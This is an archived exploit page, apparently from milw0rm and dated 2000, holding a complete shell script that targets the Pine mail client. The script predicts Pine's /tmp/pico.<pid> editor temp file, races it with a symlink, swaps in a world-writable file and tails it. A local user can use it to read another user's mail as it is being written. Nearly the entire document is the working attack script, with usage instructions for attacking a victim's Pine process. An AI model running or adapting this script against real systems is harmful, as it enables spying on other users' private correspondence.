<html><head><title>Pine (Local Message Grabber) Exploit</title></head><pre>#!/bin/sh
# Grab local pine messages
# Usage: ./mon_pine.sh &lt;pid of pine process&gt;
# victim pine must use following settings
#
#  mat@hacksware.com
#  http://hacksware.com
#
# [x]  enable-alternate-editor-cmd
# [x]  enable-alternate-editor-implicitly
# editor                   = /usr/bin/vi
#

PID=$1
PICO_FILE=`printf &quot;/tmp/pico.%.6d&quot; $PID`
TRASHCAN=/tmp/.trashcan.`date|sed &quot;s/ //g&quot;`
echo PICO_FILE is $PICO_FILE

#if $PICO_FILE and $TRASHCAN exists, remove them
if test -f $PICO_FILE
then
 rm -f $PICO_FILE
fi
if test -f $TRASHCAN
then
 rm -f $TRASHCAN
fi

ln -s $TRASHCAN $PICO_FILE
while :
do
 if test -f $TRASHCAN
 then
  break
 fi
done

echo Victim is Editing Pine Message
rm -f $PICO_FILE
echo We replace temporary file
touch $PICO_FILE
chmod 777 $PICO_FILE
echo &quot;Get the message from &quot;$PICO_FILE
echo &quot;^C to break tailer&quot;
tail -f $PICO_FILE


# milw0rm.com [2000-12-15]</pre></html>